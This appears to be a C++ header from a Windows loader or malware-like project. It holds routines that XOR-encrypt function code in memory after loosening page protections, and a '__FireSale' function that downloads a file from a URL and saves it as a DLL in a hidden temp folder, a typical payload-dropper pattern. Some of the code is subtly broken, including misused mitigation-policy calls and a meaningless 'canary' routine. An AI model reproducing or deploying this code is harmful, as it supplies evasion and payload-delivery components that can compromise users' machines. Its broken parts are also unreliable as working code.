#pragma once
#include "includes.hpp"

unsigned char key[16] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F};

unsigned long __declspec(naked) __fastcall get_canary()
{
    __asm {
        push ebp
        mov ebp, esp
        sub esp, __LOCAL_SIZE
        mov eax, [ebp+4]
        mov [ebp-4], eax
        mov eax, [ebp-4]
        leave
        ret 4
    }
}

void encrypt_function(void* function, size_t size) {
    DWORD old_protection;
    VirtualProtect(function, size, PAGE_EXECUTE_READWRITE, &old_protection);

    for (size_t i = 0; i < size; i++) {
        char* ptr = (char*)function + i;
        *ptr ^= key[i % 16];
    }

    VirtualProtect(function, size, old_protection, &old_protection);
}

void decrypt_function(void* function, size_t size) {
    DWORD old_protection;
    VirtualProtect(function, size, PAGE_EXECUTE_READWRITE, &old_protection);

    for (size_t i = 0; i < size; i++) {
        char* ptr = (char*)function + i;
        *ptr ^= key[i % 16];
    }

    VirtualProtect(function, size, old_protection, &old_protection);
}

void __fastcall __KernelRoutine() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        return;
    }

    void* pSetProcessDEPPolicy = GetProcAddress(hKernel32, "SetProcessDEPPolicy");
    if (pSetProcessDEPPolicy == NULL) {
        return;
    }

    typedef BOOL (WINAPI *pfnSetProcessDEPPolicy)(DWORD);
    pfnSetProcessDEPPolicy SetProcessDEPPolicy = (pfnSetProcessDEPPolicy)pSetProcessDEPPolicy;

    if (!SetProcessDEPPolicy(PROCESS_DEP_ENABLE)) {
        return;
    }

    ULONG oldValue = 0;
    if (!SetProcessMitigationPolicy(ProcessASLRPolicy, &(PROCESS_MITIGATION_ASLR_POLICY){ ProcessASLR_Enabled }, sizeof(PROCESS_MITIGATION_ASLR_POLICY), &oldValue)) {
        return;
    }
}

bool __FireSale(const std::string& url, const std::string& file_name) {
    TCHAR temp_path[MAX_PATH];
    GetTempPath(MAX_PATH, temp_path);
    std::string temp_dir = std::string(temp_path) + "\\." + file_name;
    CreateDirectoryA(temp_dir.c_str(), NULL);

    cpr::Response response = cpr::Get(cpr::Url{url});

    if (response.status_code != 200) {
        return false;
    }

    std::ofstream dll_file(temp_dir + "\\" + file_name, std::ios::binary);
    dll_file.write(response.text.c_str(), response.text.size());
    dll_file.close();

    return true;
}

// discord:<type>:<identifier>
